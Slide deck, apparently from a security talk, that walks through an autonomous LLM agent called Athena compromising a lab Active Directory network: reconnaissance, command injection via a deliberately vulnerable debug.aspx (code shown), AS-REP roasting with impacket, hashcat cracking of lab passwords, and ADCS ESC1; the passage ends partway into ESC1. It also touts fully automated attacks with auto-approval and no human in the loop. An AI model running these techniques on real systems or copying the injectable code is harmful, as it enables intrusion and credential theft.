---
transition: fade
---

<!-- Slide 29 from Harry's PPT — Ch5 Operation · CHAPTER COVER · 真槍實彈 -->

<div class="deco-squares tl"><div class="sq"></div><div class="sq"></div><div class="sq"></div></div>
<div class="deco-squares br"><div class="sq"></div><div class="sq"></div><div class="sq"></div></div>

<div style="height: 100%; display: flex; flex-direction: column; justify-content: center; padding: 0 4rem;">

<div class="slide-eyebrow" style="margin-bottom: 2rem;">// CHAPTER 05 :: OPERATION</div>

<div style="display: grid; grid-template-columns: 1fr 2fr; gap: 4rem; align-items: center;">

<div style="font-family: 'JetBrains Mono', monospace; font-size: 12rem; font-weight: 700; line-height: 1; color: var(--accent-green); text-shadow: 0 0 32px rgba(63, 185, 80, 0.45);">
05
</div>

<div>

<div style="font-size: 2.4rem; font-weight: 700; line-height: 1.3; color: var(--fg); margin-bottom: 1.6rem;">
理論講完了 — 真槍實彈
</div>

<div style="font-size: 1.05rem; line-height: 1.7; color: var(--fg-dim);">
三個 stage、不到 20 分鐘、零人工介入：<br/>
<strong style="color: var(--fg);">WEB01 → DC-01 → ACCT-DB01</strong>。
</div>

<div style="margin-top: 1.4rem; font-size: 1rem; font-weight: 600; color: var(--accent-green); border-left: 3px solid var(--accent-green); padding-left: 1rem;">
剛剛三條信條，每一頁印證一次。
</div>

</div>

</div>

</div>

---
transition: fade
---

<!-- Slide 30 from Harry's PPT — Ch5 Operation · ARCHITECTURE · Athena 系統架構 -->

<div class="slide-eyebrow">ARCHITECTURE / OVERVIEW</div>
<div class="slide-h1">Athena 系統架構</div>
<div class="slide-sub">每一層都可獨立替換 — Anthropic / OpenAI / 在地 LLM 都跑得起來。</div>

<div style="display: flex; flex-direction: column; gap: 0.6rem; margin-top: 1.4rem;">

<div style="background: var(--bg-elev); border: 1px solid var(--accent-green); border-radius: 6px; padding: 0.8rem 1.1rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 0.95rem;">▌ WAR ROOM (UI)</div>
<div style="color: var(--fg); font-size: 0.88rem; margin-top: 0.3rem;">Next.js 即時面板 / WebSocket 廣播 / 操作指揮</div>
</div>

<div style="text-align: center; color: var(--accent-amber); font-family: 'JetBrains Mono', monospace;">↓</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-amber); border-radius: 6px; padding: 0.8rem 1.1rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-amber); font-size: 0.95rem;">▌ OODA ENGINE</div>
<div style="color: var(--fg); font-size: 0.88rem; margin-top: 0.3rem;">Observe → Orient → Decide → Act （30s loop）</div>
</div>

<div style="text-align: center; color: var(--accent-amber); font-family: 'JetBrains Mono', monospace;">↓</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-blue); border-radius: 6px; padding: 0.8rem 1.1rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-blue); font-size: 0.95rem;">▌ DECISION + FACTS DB</div>
<div style="color: var(--fg); font-size: 0.88rem; margin-top: 0.3rem;">信心值矩陣 / 風險門檻 / PostgreSQL Facts</div>
</div>

<div style="text-align: center; color: var(--accent-amber); font-family: 'JetBrains Mono', monospace;">↓</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-red); border-radius: 6px; padding: 0.8rem 1.1rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-red); font-size: 0.95rem;">▌ MCP TOOL LAYER</div>
<div style="color: var(--fg); font-size: 0.88rem; margin-top: 0.3rem;">17 個 server · 動態路由 · 各司其職</div>
</div>

</div>

---
transition: fade
---

<!-- Slide 31 from Harry's PPT — Ch5 Operation · MISSION · 今天的目標 -->

<div class="slide-eyebrow">MISSION / TARGETS</div>
<div class="slide-h1">今天的目標</div>

<div class="kill-chain compact" style="margin: 1.4rem 0;">

<div class="kc-node benign">
<div class="label">Attacker</div>
<div class="sub">192.168.0.10<br/>Athena C2</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node recon">
<div class="label">WEB01</div>
<div class="sub">192.168.0.20<br/>IIS + ASP.NET</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node exploit">
<div class="label">DC-01</div>
<div class="sub">192.168.0.16<br/>AD DS + ADCS</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node attacker">
<div class="label">ACCT-DB01</div>
<div class="sub">192.168.0.23<br/>MSSQL 財務</div>
</div>

</div>

<div class="alert-box" style="margin-top: 1.2rem;">
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-green); font-weight: 700; font-size: 0.85rem; margin-bottom: 0.4rem;">▌ MISSION BRIEF</div>
<div style="font-size: 1rem; color: var(--fg); margin-bottom: 0.4rem;">三台靶機・全強密碼・純靠 AD 設定錯誤・全自動 OODA 模式・預期 &lt; 20 分鐘</div>
<div style="font-size: 0.88rem; color: var(--accent-amber);">接下來看 AI 怎麼打穿這三台。</div>
</div>

<div style="margin-top: 1rem; font-size: 0.85rem; font-style: italic; color: var(--accent-green);">
目標確認 — 接下來 24 張，看 Athena 怎麼一步步打過去 →
</div>

---
transition: fade
---

<!-- Slide 32 from Harry's PPT — Ch5 Operation · EDGE-CASES · 踩過的坑（hidden in original PPTX） -->

<div class="slide-eyebrow">ARCHITECTURE / EDGE-CASES</div>
<div class="slide-h1">踩過的坑 — 不是每次都這麼順</div>
<div class="slide-sub">200+ 次 demo，這三個是出現頻率最高的 failure mode。</div>

<div style="display: flex; flex-direction: column; gap: 0.7rem; margin-top: 1.2rem;">

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem 1rem; display: grid; grid-template-columns: 3rem 1fr; gap: 1rem; align-items: start;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 1.6rem;">01</div>
<div>
<div style="font-weight: 700; color: var(--fg); font-size: 1rem;">EDR 擋下 LSASS dump</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem; line-height: 1.5;">LLM 推 <code>T1003.001 confidence=0.92</code>，Defender 直接 kill process。composite 經 history 校正降到 0.34，下一輪改走 <code>T1003.003 (SAM hive)</code>。</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-faint); margin-top: 0.3rem;">教訓：LLM 信心 ≠ 環境可行性，必須過 history filter</div>
</div>
</div>

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem 1rem; display: grid; grid-template-columns: 3rem 1fr; gap: 1rem; align-items: start;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 1.6rem;">02</div>
<div>
<div style="font-weight: 700; color: var(--fg); font-size: 1rem;">Bloodhound 超時 partial facts</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem; line-height: 1.5;">大型 AD（5000+ 物件）collector 跑超過 OODA interval。改採 streaming write — 每收到一批就寫 facts，下輪 Orient 用部分情報先推進。</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-faint); margin-top: 0.3rem;">trade-off: 情報不完整 vs 不卡 loop</div>
</div>
</div>

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem 1rem; display: grid; grid-template-columns: 3rem 1fr; gap: 1rem; align-items: start;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 1.6rem;">03</div>
<div>
<div style="font-weight: 700; color: var(--fg); font-size: 1rem;">平行 kill chain race condition</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem; line-height: 1.5;">兩條鏈同時寫 <code>access.local_admin</code> → 後者覆蓋前者。改用 PostgreSQL advisory lock 鎖 fact key，後寫者 append 不覆蓋。</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-faint); margin-top: 0.3rem;"><code>SELECT pg_advisory_xact_lock(hash('access.local_admin'))</code></div>
</div>
</div>

</div>

---
transition: fade
---

<!-- Slide 33 from Harry's PPT — Ch5 Operation · INTEL · 靶機 AD 設定錯誤全景 -->

<div class="slide-eyebrow">INTEL / RECON</div>
<div class="slide-h1">靶機 AD 設定錯誤全景</div>

<table class="matrix" style="margin-top: 1rem;">
<thead>
<tr>
<th style="width: 32%">設定錯誤</th>
<th style="width: 24%">受影響</th>
<th style="width: 14%">MITRE</th>
<th style="width: 30%">與密碼強度的關係</th>
</tr>
</thead>
<tbody>
<tr>
<td>ASP.NET 命令注入</td>
<td>WEB01 debug.aspx</td>
<td><code style="color: var(--accent-amber);">T1190</code></td>
<td style="color: var(--accent-red);"><strong>無關</strong></td>
</tr>
<tr>
<td><code>DoesNotRequirePreAuth=True</code></td>
<td>legacy_kev</td>
<td><code style="color: var(--accent-amber);">T1558.004</code></td>
<td style="color: var(--accent-red);"><strong>無關</strong></td>
</tr>
<tr>
<td>ADCS ESC1 (VulnTemplate1)</td>
<td>Domain Users</td>
<td><code style="color: var(--accent-amber);">T1649</code></td>
<td style="color: var(--accent-red);"><strong>無關</strong></td>
</tr>
<tr>
<td>無約束委派</td>
<td>WEB01$ 電腦帳號</td>
<td><code style="color: var(--accent-amber);">T1187</code></td>
<td style="color: var(--accent-red);"><strong>無關</strong></td>
</tr>
<tr>
<td><code>xp_cmdshell</code> 啟用</td>
<td>ACCT-DB01 MSSQL</td>
<td><code style="color: var(--accent-amber);">T1059.001</code></td>
<td style="color: var(--accent-red);"><strong>無關</strong></td>
</tr>
</tbody>
</table>

<div style="margin-top: 1.6rem; font-size: 1.6rem; font-weight: 700; color: var(--accent-amber);">
五條，沒有一條跟密碼有關。
</div>

---
transition: fade
---

<!-- Slide 34 from Harry's PPT — Ch5 Operation · INTEL · 密碼強度全部強密碼 -->

<div class="slide-eyebrow">INTEL / CREDS</div>
<div class="slide-h1">密碼強度：全部強密碼</div>

<table class="matrix" style="margin-top: 1rem;">
<thead>
<tr>
<th style="width: 22%">帳號</th>
<th style="width: 38%">密碼</th>
<th style="width: 40%">備註</th>
</tr>
</thead>
<tbody>
<tr>
<td><code style="color: var(--accent-blue);">legacy_kev</code></td>
<td><code style="color: var(--accent-amber);">M0nk3y!B@n4n4#99</code></td>
<td>強密碼，仍被破解</td>
</tr>
<tr>
<td><code style="color: var(--accent-blue);">da_alice</code></td>
<td><code style="color: var(--accent-amber);">W!nt3rC0m!ng#DA2026$</code></td>
<td>DA 帳號，從未被猜出</td>
</tr>
<tr>
<td><code style="color: var(--accent-blue);">administrator</code></td>
<td><code style="color: var(--accent-amber);">X9k#mP2!vL@qR7$</code></td>
<td>完全無法暴力破解</td>
</tr>
</tbody>
</table>

<div class="danger-box" style="margin-top: 1.6rem; text-align: center;">
<span style="font-size: 1.4rem; font-weight: 700; color: var(--accent-red);">密碼噴灑全部失敗。AI 選擇了另一條路。</span>
</div>

---
transition: fade
---

<!-- Slide 35 from Harry's PPT — Ch5 Operation · STAGE 0 · 行動啟動（kickoff · OODA loop start） -->

<div class="op-header">
<span>// OPERATION ATHENA-KICKOFF</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="op-layout">
<div class="op-content">

<div class="slide-eyebrow">STAGE 0 / KICKOFF</div>
<div class="slide-h1">行動啟動 <span class="status active">ACTIVE</span></div>
<div class="slide-sub">AUTO_FULL · interval=30s · noise budget=100</div>

<div class="kill-chain compact" style="margin: 1.4rem 0;">
<div class="kc-node benign"><div class="label">C2</div><div class="sub">Athena</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node recon"><div class="label">WEB01</div><div class="sub">queued</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node recon"><div class="label">DC-01</div><div class="sub">queued</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node recon"><div class="label">ACCT-DB01</div><div class="sub">queued</div></div>
</div>

<div class="alert-box" style="margin-top: 1rem;">
OODA loop 啟動 — 全自動模式、人類不介入。
</div>

</div>

<div class="ops-log">
<div class="ops-header">// OPS LOG · ATHENA · 20:54:06</div>

```bash {1|2|3|4|5|6|all}
[20:54:06] ● MODE      AUTO_FULL
[20:54:06] ● INTERVAL  30s / loop
[20:54:06] ● RISK      medium
[20:54:06] ● NOISE     100
[20:54:06] ● STATE     → OBSERVE
[20:54:06] ● 行動啟動 · OODA loop 開始
```

</div>
</div>

---
transition: fade
---

<!-- Slide 36 from Harry's PPT — Ch5 Operation · STAGE 0 · WEB01 OBSERVE recon -->

<div class="op-header">
<span>// OPERATION ATHENA-RECON</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="op-layout">
<div class="op-content">

<div class="slide-eyebrow">STAGE 0 / WEB01 · OBSERVE</div>
<div class="slide-h1">WEB01 — 偵察 <span class="status scanning">SCANNING</span></div>
<div class="slide-sub">**WEB01** <span class="status scanning">SCANNING</span> · 192.168.0.20</div>

<div class="cmd-list" style="margin-top: 1.2rem;">
<div class="cmd-row">
<span class="num">●</span>
<span class="cmd">nmap -Pn -p- 192.168.0.20</span>
<span class="tag">recon</span>
</div>
<div class="cmd-row">
<span class="num">●</span>
<span class="cmd">port 80 / 5985 / 445 OPEN</span>
<span class="tag">found</span>
</div>
<div class="cmd-row critical">
<span class="num">●</span>
<span class="cmd">curl http://192.168.0.20/ → debug.aspx 路徑可達</span>
<span class="tag">vuln</span>
</div>
</div>

<div class="alert-box" style="margin-top: 1rem;">
寫入 PostgreSQL Facts DB · 等待 LLM Orient
</div>

</div>

<div class="ops-log">
<div class="ops-header">// OPS LOG · WEB01</div>

```bash {1|2|3|4|5|6|7|all}
[20:54:08] ● OODA      > OBSERVE
[20:54:09] ● TOOL      nmap-scanner
[20:54:21] ● PORT 80   IIS 8.5
[20:54:21] ● PORT 5985 WinRM
[20:54:21] ● PORT 445  SMB
[20:54:32] ● /debug.aspx FOUND
[20:54:33] ● NEXT      → ORIENT
```

</div>
</div>

---
transition: fade
---

<!-- Slide 37 from Harry's PPT — Ch5 Operation · STAGE 0 · WEB01 ORIENT (LLM decision T1190) -->

<div class="op-header">
<span>// OPERATION ATHENA-ORIENT</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="slide-eyebrow">STAGE 0 / WEB01 · ORIENT</div>
<div class="slide-h1">WEB01 — 判斷</div>
<div class="slide-sub">LLM 自己決定要用 <code>web_rce_execute</code>，不是我們寫死的。</div>

<div class="compare-2" style="margin-top: 1.4rem;">

<div class="side" style="border-left: 3px solid var(--accent-amber);">
<div class="head" style="color: var(--accent-amber); font-family: 'JetBrains Mono', monospace; font-size: 0.9rem;">▌ SITUATION ASSESSMENT</div>
<div class="body" style="color: var(--fg); font-size: 0.95rem; line-height: 1.6;">
WEB01 開放 port 80<br/>
<code>IIS + ASP.NET</code><br/>
偵測到 <code>debug.aspx</code> 路徑<br/><br/>
推測為遺留診斷頁面，<br/>
未經 production hardening。
</div>
</div>

<div class="center"></div>

<div class="side green-border">
<div class="head" style="color: var(--accent-green); font-family: 'JetBrains Mono', monospace; font-size: 0.9rem;">▌ RECOMMENDED TECHNIQUE</div>
<div class="body" style="font-size: 0.85rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 2.2rem; font-weight: 700; color: var(--fg); margin: 0.2rem 0;">T1190</div>
<div style="color: var(--fg-dim); margin-bottom: 0.6rem;">Exploit Public-Facing Application</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: var(--fg-dim);">confidence</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 2rem; font-weight: 700; color: var(--accent-green);">0.75</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: var(--fg-dim); margin-top: 0.4rem;">mcp_tool</div>
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-amber); font-size: 0.85rem;">web-scanner:web_rce_execute</div>
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-green); font-size: 0.85rem; margin-top: 0.3rem;">auto_approved = True</div>
</div>
</div>

</div>

---
transition: fade
---

<!-- Slide 38 from Harry's PPT — Ch5 Operation · STAGE 0 · WEB01 ACT (debug.aspx RCE) -->

<div class="op-header">
<span>// OPERATION ATHENA-EXPLOIT</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="slide-eyebrow">STAGE 0 / WEB01 · ACT</div>
<div class="slide-h1">WEB01 — 行動：<code>debug.aspx</code></div>
<div class="slide-sub">零過濾，<code>cmdArg</code> 直接拼入 <code>cmd.exe /c</code>。</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-red); border-left: 3px solid var(--accent-red); border-radius: 4px; padding: 0.7rem 1rem; margin-top: 1rem; font-family: 'JetBrains Mono', monospace;">
<div style="color: var(--accent-red); font-size: 0.7rem; letter-spacing: 0.18em; margin-bottom: 0.4rem;">● ● ●  HTTP REQUEST</div>

```bash
GET http://192.168.0.20/debug.aspx?cmd=whoami
→ iis apppool\defaultapppool
```

</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-amber); border-left: 3px solid var(--accent-amber); border-radius: 4px; padding: 0.7rem 1rem; margin-top: 0.8rem;">
<div style="color: var(--accent-amber); font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; letter-spacing: 0.18em; margin-bottom: 0.4rem;">● ● ●  debug.aspx (vulnerable code)</div>

```csharp
var psi = new ProcessStartInfo("cmd.exe", "/c " + cmdArg);
psi.RedirectStandardOutput = true;
Response.Write(Server.HtmlEncode(p.StandardOutput.ReadToEnd()));
// cmdArg 完全沒過濾，使用者可塞任何 OS 指令
```

</div>

<div class="danger-box" style="margin-top: 1rem;">
<strong>零過濾</strong>，<code>cmdArg</code> 直接拼入 <code>cmd.exe /c</code>。LLM 看到原始碼推測 RCE 信心 0.75 → 直接 fire。
</div>

---
transition: fade
---

<!-- Slide 39 from Harry's PPT — Ch5 Operation · STAGE 0 · WEB01 DONE (compromised) -->

<div class="op-header">
<span>// OPERATION ATHENA-FOOTHOLD</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="op-layout">
<div class="op-content">

<div class="slide-eyebrow">STAGE 0 / WEB01 · DONE</div>
<div class="slide-h1">WEB01 — 攻陷 <span class="status compromised">COMPROMISED</span></div>
<div class="slide-sub">**WEB01** <span class="status compromised">COMPROMISED</span> · iis apppool\defaultapppool</div>

<div class="kill-chain compact" style="margin: 1.4rem 0;">
<div class="kc-node benign"><div class="label">C2</div><div class="sub">Athena</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node exploit"><div class="label">WEB01</div><div class="sub">RCE</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node recon"><div class="label">DC-01</div><div class="sub">next</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node recon"><div class="label">ACCT-DB01</div><div class="sub">queued</div></div>
</div>

<div class="alert-box" style="margin-top: 1rem;">
寫入 facts: <code>access.web_shell · vector=T1190</code> — 第一台攻陷，預備 lateral 到 DC-01。
</div>

</div>

<div class="ops-log">
<div class="ops-header">// OPS LOG · 21:01:33</div>

```bash {1|2|3|4|5|6|7|all}
[20:54:35] ● TARGET    WEB01 / 192.168.0.20
[20:54:42] ● VECTOR    T1190 ASP.NET RCE
[20:55:03] ● PAYLOAD   → /debug.aspx?cmd=
[20:58:14] ● SHELL     iis apppool\
[21:01:33] ● ★ COMPROMISED · Δ +7m27s
[21:01:34] ● NEXT      → DC-01
[21:01:35] ● fact saved access.web_shell
```

</div>
</div>

---
transition: fade
---

<!-- Slide 40 from Harry's PPT — Ch5 Operation · STAGE 1 · DC-01 OBSERVE (AS-REP ready) -->

<div class="op-header">
<span>// OPERATION ATHENA-LATERAL</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="op-layout">
<div class="op-content">

<div class="slide-eyebrow">STAGE 1 / DC-01 · OBSERVE</div>
<div class="slide-h1">DC-01 — 偵察 <span class="status scanning">SCANNING</span></div>
<div class="slide-sub">**DC-01** <span class="status scanning">SCANNING</span> · 192.168.0.16 · AD DS + ADCS</div>

<div class="cmd-list" style="margin-top: 1.2rem;">
<div class="cmd-row">
<span class="num">●</span>
<span class="cmd">nmap -Pn -p 88,389,445 192.168.0.16</span>
<span class="tag">recon</span>
</div>
<div class="cmd-row">
<span class="num">●</span>
<span class="cmd">bloodhound-collector -d corp.athena.lab</span>
<span class="tag">enum</span>
</div>
<div class="cmd-row critical">
<span class="num">●</span>
<span class="cmd">★ legacy_kev: DoesNotRequirePreAuth = True</span>
<span class="tag">as-rep</span>
</div>
</div>

<div class="alert-box" style="margin-top: 1rem;">
DoesNotRequirePreAuth=True 已被偵測 — AS-REP roasting 路徑可行。
</div>

</div>

<div class="ops-log">
<div class="ops-header">// OPS LOG · DC-01</div>

```bash {1|2|3|4|5|6|7|all}
[21:01:40] ● OODA      > OBSERVE
[21:01:42] ● TOOL      bloodhound-collector
[21:01:55] ● PORT 88   KDC
[21:01:55] ● PORT 389  LDAP
[21:01:55] ● PORT 445  SMB
[21:02:18] ● ad.user_no_preauth: legacy_kev
[21:02:19] ● ★ AS-REP READY
```

</div>
</div>

---
transition: fade
---

<!-- Slide 41 from Harry's PPT — Ch5 Operation · STAGE 1 · AS-REP Roasting 原理 -->

<div class="slide-eyebrow">STAGE 1 / DC-01 · PRINCIPLE</div>
<div class="slide-h1">AS-REP Roasting 原理</div>
<div class="slide-sub">MITRE ATT&CK · T1558.004 · AS-REP Roasting</div>

<div class="kill-chain compact" style="margin: 1.6rem 0; gap: 0.8rem;">

<div class="kc-node recon" style="min-width: 9rem;">
<div class="label">1. 攻擊者</div>
<div class="sub">要求 legacy_kev 的 AS-REP<br/>（零憑證請求）</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node attacker" style="min-width: 9rem;">
<div class="label">2. KDC</div>
<div class="sub">DoesNotRequirePreAuth=True<br/>→ 直接回傳 AS-REP</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node exploit" style="min-width: 9rem;">
<div class="label">3. 攻擊者</div>
<div class="sub">取得 AS-REP enc-part<br/>→ 可離線破解 NT hash</div>
</div>

</div>

<div class="danger-box" style="margin-top: 1.4rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-red); font-size: 0.9rem; margin-bottom: 0.4rem;">▌ 為何零憑證可行</div>
<div style="font-size: 1rem; line-height: 1.5;">
正常情況下 KDC 要求先驗證你是誰（pre-authentication）。<br/>
<code>DoesNotRequirePreAuth=True</code> 把這個驗證關掉了 — KDC 對任何人都吐 AS-REP。
</div>
</div>

---
transition: fade
---

<!-- Slide 42 from Harry's PPT — Ch5 Operation · STAGE 1 · AS-REP Hash 取得 (impacket-GetNPUsers · image6 secretsdump) -->

<div class="op-header">
<span>// OPERATION ATHENA-DUMP</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="slide-eyebrow">STAGE 1 / DC-01 · ACT</div>
<div class="slide-h1">AS-REP Hash 取得 <span class="status dumped">DUMPED</span></div>
<div class="slide-sub">零憑證，只需要知道帳號名稱。</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-amber); border-left: 3px solid var(--accent-amber); border-radius: 4px; padding: 0.7rem 1rem; margin-top: 1rem;">
<div style="color: var(--accent-amber); font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; letter-spacing: 0.18em; margin-bottom: 0.4rem;">● ● ●  command</div>

```bash
$ impacket-GetNPUsers corp.athena.lab/ \
      -no-pass -usersfile users.txt

[*] Getting AS_REP for legacy_kev
$krb5asrep$23$legacy_kev@CORP.ATHENA.LAB:
3a7f8c2d4e1b5a9f6c3d8e2b7a1f4c9d...  (558 chars)
```

</div>

![secretsdump](/image6.png)

<div class="alert-box" style="margin-top: 0.8rem;">
寫入 facts: <code>access.kerberos.as_rep.legacy_kev</code> · etype=23 (rc4-hmac) · hashcat -m 18200 直接吃。
</div>

---
transition: fade
---

<!-- Slide 43 from Harry's PPT — Ch5 Operation · STAGE 1 · AS-REP Roasting OPSEC -->

<div class="slide-eyebrow">STAGE 1 / AS-REP-PROOF</div>
<div class="slide-h1">AS-REP Roasting</div>
<div class="slide-sub">協定的縫隙就是入口 — 一份 AS-REP，一條通往 DA 的路</div>

<div style="display: flex; flex-direction: column; gap: 0.7rem; margin-top: 1.2rem;">

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem 1rem; display: grid; grid-template-columns: 3rem 1fr; gap: 1rem; align-items: start;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 1.6rem;">01</div>
<div>
<div style="font-weight: 700; color: var(--fg); font-size: 1rem;">KRB_AS_REQ — 沒有 PA-ENC-TIMESTAMP</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem; line-height: 1.5;">正常 client 會在 padata 帶加密時間戳證明身分。<code>legacy_kev</code> 的 request 完全沒帶 — KDC 仍接受。</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-faint); margin-top: 0.3rem;">padata: (empty) ← <code>DoesNotRequirePreAuth=True</code> 的視覺證據</div>
</div>
</div>

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem 1rem; display: grid; grid-template-columns: 3rem 1fr; gap: 1rem; align-items: start;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 1.6rem;">02</div>
<div>
<div style="font-weight: 700; color: var(--fg); font-size: 1rem;">KRB_AS_REP — enc-part 直接吐出</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem; line-height: 1.5;">KDC 回的 enc-part 用 user 的 NT hash 加密。拿到這段就能離線爆破。</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-faint); margin-top: 0.3rem;">etype: rc4-hmac (23) ← <code>hashcat -m 18200</code> 直接吃</div>
</div>
</div>

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem 1rem; display: grid; grid-template-columns: 3rem 1fr; gap: 1rem; align-items: start;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 1.6rem;">03</div>
<div>
<div style="font-weight: 700; color: var(--fg); font-size: 1rem;">OPSEC — 為什麼這招難被抓</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem; line-height: 1.5;">零憑證、單次請求、合法 Kerberos 流量。爆破在離線、不打 KDC，不留登入失敗紀錄。</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-faint); margin-top: 0.3rem;">noise_cost: 2  ·  網路上看起來就是一次正常的 AS-REQ</div>
</div>
</div>

</div>

---
transition: fade
---

<!-- Slide 44 from Harry's PPT — Ch5 Operation · STAGE 1 · hashcat 破解 -->

<div class="op-header">
<span>// OPERATION ATHENA-CRACK</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="slide-eyebrow">STAGE 1 / DC-01 · CRACK</div>
<div class="slide-h1">hashcat 破解</div>
<div class="slide-sub">強密碼也擋不住離線爆破 — 關鍵在於不該讓 hash 流出。</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-red); border-left: 3px solid var(--accent-red); border-radius: 4px; padding: 0.7rem 1rem; margin-top: 1rem;">
<div style="color: var(--accent-red); font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; letter-spacing: 0.18em; margin-bottom: 0.4rem;">● ● ●  hashcat -m 18200  (Kerberos AS-REP)</div>

```bash
$ hashcat -m 18200 asrep.hash rockyou.txt

Status...........: Cracked
Recovered........: 1/1 (100.00%) Digests

$krb5asrep$...:  M0nk3y!B@n4n4#99
```

</div>

<div class="compare-2" style="margin-top: 1rem;">

<div class="side" style="border-left: 3px solid var(--accent-amber);">
<div class="head" style="color: var(--accent-amber); font-family: 'JetBrains Mono', monospace; font-size: 0.85rem;">▌ 線上攻擊</div>
<div class="body" style="font-size: 0.88rem;">
登入 KDC 試密碼<br/>
5 次失敗 → 帳號鎖定<br/>
速度受限於網路 + 鎖定政策
</div>
</div>

<div class="center"></div>

<div class="side red-border">
<div class="head" style="color: var(--accent-red); font-family: 'JetBrains Mono', monospace; font-size: 0.85rem;">▌ 離線攻擊（這次）</div>
<div class="body" style="font-size: 0.88rem;">
已有 AS-REP hash 在手<br/>
無限嘗試，沒有鎖定<br/>
速度只受 GPU 限制
</div>
</div>

</div>

---
transition: fade
---

<!-- Slide 45 from Harry's PPT — Ch5 Operation · STAGE 1 · ADCS ESC1 原理 -->

<div class="slide-eyebrow">STAGE 1 / DC-01 · PRINCIPLE</div>
<div class="slide-h1">ADCS ESC1 原理</div>
<div class="slide-sub">MITRE ATT&CK · T1649 · 整個過程合法走 ADCS API</div>

<div class="alert-box" style="margin-top: 1rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-amber); font-size: 0.9rem; margin-bottom: 0.4rem;">▌ ENROLLEE_SUPPLIES_SUBJECT</div>
<div style="font-size: 0.95rem; line-height: 1.5;">
憑證模板允許申請者「自行指定」憑證的 SAN（Subject Alternative Name）— 你寫誰，CA 就把它簽進憑證裡。
</div>
</div>

<div class="kill-chain compact" style="margin: 1.4rem 0; gap: 0.8rem;">

<div class="kc-node recon" style="min-width: 8rem;">
<div class="label">1</div>
<div class="sub">legacy_kev 用破解出的密碼登入 AD</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node exploit" style="min-width: 8rem;">
<div class="label">2</div>
<div class="sub">申請 VulnTemplate1<br/>UPN 填 da_alice@corp.athena.lab</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node attacker" style="min-width: 8rem;">
<div class="label">3</div>
<div class="sub">CA 沒驗證身分<br/>→ 簽發 da_alice.pfx</div>
</div>

</div>

---
transition: fade
